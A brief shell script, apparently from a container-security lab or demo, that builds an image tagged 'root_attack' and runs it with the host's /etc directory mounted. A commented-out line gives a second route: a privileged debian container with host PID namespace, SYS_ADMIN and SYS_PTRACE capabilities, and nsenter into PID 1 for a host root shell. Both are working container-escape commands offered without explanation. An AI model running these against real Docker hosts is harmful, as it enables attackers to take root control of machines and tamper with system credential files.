#!/bin/sh

docker build . -t root_attack
docker run --rm -it -v /etc:/etc root_attack

#docker run --rm -it --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_PTRACE --cap-add SYS_ADMIN debian:latest nsenter -t 1 -m /bin/bash


